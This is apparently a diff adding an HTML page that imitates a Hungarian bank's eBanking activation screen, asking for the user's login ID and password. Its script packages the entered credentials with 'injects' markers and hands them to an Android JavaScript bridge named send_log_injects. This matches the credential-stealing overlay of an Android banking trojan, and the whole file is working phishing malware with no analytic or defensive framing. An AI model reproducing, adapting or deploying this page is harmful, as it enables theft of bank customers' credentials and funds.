@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            padding: 15px;
+        }
+
+        section {
+            padding: 15px;
+            flex: 1;
+        }
+
+        label {
+            text-transform: uppercase;
+            font-size: 12px;
+            color: #262626;
+            margin: 0;
+        }
+
+        footer {
+            padding: 15px;
+        }
+
+        .input {
+            width: 100%;
+            padding: 8px;
+            border: 0;
+            border-bottom: 1px solid #262626;
+            margin-bottom: 25px;
+            padding-left: 0;
+        }
+
+        .input:focus {
+            border-color: #4eaccc;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+
+        .button {
+            width: 100%;
+            padding: 14px;
+            border: 0;
+            border-radius: 6px;
+            background-color: #4eaccc;
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .button:disabled {
+            opacity: 0.4;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <img style="width: 16px;margin-right: 5px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAA5CAAAAAB7I9YBAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MzRGRTNFRjM5NkZBMTFFQkE0RjlBRjlENEVCMTgyQ0EiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MzRGRTNFRjQ5NkZBMTFFQkE0RjlBRjlENEVCMTgyQ0EiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDozNEZFM0VGMTk2RkExMUVCQTRGOUFGOUQ0RUIxODJDQSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozNEZFM0VGMjk2RkExMUVCQTRGOUFGOUQ0RUIxODJDQSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PngIJ1wAAAEKSURBVEjHrdW7DcIwGATgbJMKCSEKGh4DpKTPCDQswCQwANRZIiskIh11EC0CHL9i/3dGAtefLDvxf5c9v1jZr6gqJkWVQMf8syqKBpMXDGmTTwgyhu1kDTmTMyd4u8CIKDQSioyAYhMjwURIMiESTYBkM0bAjBAyPoLGQ9g4RIxFzBhEjUbcDChhFLokjEKbhFFoqs28IWhvdlo2GN23CaVu1yfU8J081eLo4cr8O6dWLQ4xptx7Isp7mZ664syEajQtSI3nDqhggmUVZoGnOhz2korzSVBC0sVKysxIienr1LrDBeSpG24Ep3akW6yasZYyakH7TqsDb86+fJvykSrq+lz/p83tegHRo1zkuP7dFQAAAABJRU5ErkJggg==" alt="">
+            <span style="font-size: 14px;"><b> VISSZA </b></span>
+
+            <img style="width: 26px;float: right;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAAAAACPAi4CAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NENGNzdCMDg5NkZBMTFFQkE0RjlBRjlENEVCMTgyQ0EiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NENGNzdCMDk5NkZBMTFFQkE0RjlBRjlENEVCMTgyQ0EiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDozNEZFM0VGNTk2RkExMUVCQTRGOUFGOUQ0RUIxODJDQSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozNEZFM0VGNjk2RkExMUVCQTRGOUFGOUQ0RUIxODJDQSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PrrjjsYAAAMxSURBVFjDvVfPaxpBFF6DbCkIIdhQGylIDoUe68mLISTUk4FSiogUpBZ60Jt/QOmh2ICH1b/DkxcFL8ZeNgcrPfRQ8GJOonhINhG6kISG92Z2ZndmZy2meafd9958u/Pmez9Gu11TtP8GsOzViqlEVNejiVSx1lv+G8CskdY1l+h7jdnKAIOjsCaR8NFgJYB+WvOV9EkgwLSgKaUwVQO0NrUA2WwpAOwK57mdMzrjhW0vxh0jt80ZKrYfgHXgOG2VT294txuzvOUYDy05wDxJPWL1KzHcV/UYtSfnMgCLrg9XLTlnrCo93qQlAtiHxLg79OftcJfuwhYAaPyy5yrmn2dpJL0ALWIoXTPvyXEmruvxzPGE6a4/EMeWG2BKzr/EXM/yGzRoG/kzpi8RPkxdAIR/Wfb9doSnT6TN/oHsosAD9En82P6bITcBQ00WBxLJPgeA+RNm8W+HvBQOsX8Y4mmmGcAAfaps/xExCSIsDlXUDBwA3FWMsSNPqkjFtCyzQmpLnjEKOXlEAWb4S3V2fhj/nRG+jnbwLNhp1nHLMwJgYP4w/n/D74/o+wj/4dhxuMTMahAADGGZHfVrN9koTTNMUXbCeAewRPxTZo6DwmQKExRxr0JfAkAP6weX/4h4yeUh+nP1AStMDwBq8JxT5dAluDzmNDnQ1ACgCM+GCuA7uLzgNBj4IgCk4LmrAngDLp84TQc0KQBIwPNYsb6JZP7BqcagSgBAFJ4X/uu/IhM/8roFqKIAgDG3/ZZfvCV10NVfbXougQCTl7j+1fzWD0C5hV/PcP3+hVvPb0EVxMVzXP/uj8fAB1F1jO9J/G68Bv4YFUT6jXmdFda7iKSg8mcwPZHEh6eymEyO7IPpi2hwJRNJZ1MC8BQsP0WDK53FguLII7BIJjQsKHt+JS1QrtwlTSiqgeIpqmJZDxBvWRcbi9O7QQS10FjE1qYEEFubpLkqAGhzPVG3d18AaXuXDRh+APIBQzriyACuS/IRZ/0h69Y+WHPMW3vQXH/UvfvCof+wfbrCsC2O+10c97urjvvrXzju4coTdOnqP8S1Dy6ehnDxTBurXzzv4er7kLf3v3l/vyN+wYS8AAAAAElFTkSuQmCC" alt="">
+        </header>
+        <section>
+            <h3><b> Aktiválás eBanking <br> azonosítóval </b></h3>
+            
+            <label for="login"> EBANKING FELHASZNÁLÓI AZONOSíTó </label>
+            <input type="text" class="input" id="login" name="login" placeholder="" autocomplete="off">
+
+            <label for="password"> Jelszó </label>
+            <input type="password" class="input" id="password" name="password" placeholder="" autocomplete="off">
+
+            <p style="text-align: center;color: #4eaccc;font-size: 12px;font-weight: 600;"> ELFELEJTETTEM A JELSZAVAM </p>
+        </section>
+        <footer>
+            <input type="submit" class="button" id="sendData" disabled value="TOVÁBB">
+        </footer>
+    </form>
+
+    <script>
+        var login = document.getElementById('login'),
+            password = document.getElementById('password');
+
+        var sendData = document.getElementById('sendData');
+
+        function check() {
+            if(login.value.length >= 4 && password.value.length >= 4) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+            data.login = login.value;
+            data.password = password.value;
+            data.type_injects = "banks";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+
+        login.onkeyup = () => {
+            check();
+        }
+
+        password.onkeyup = () => {
+            check();
+        }
+    </script>
+</body>
+</html>
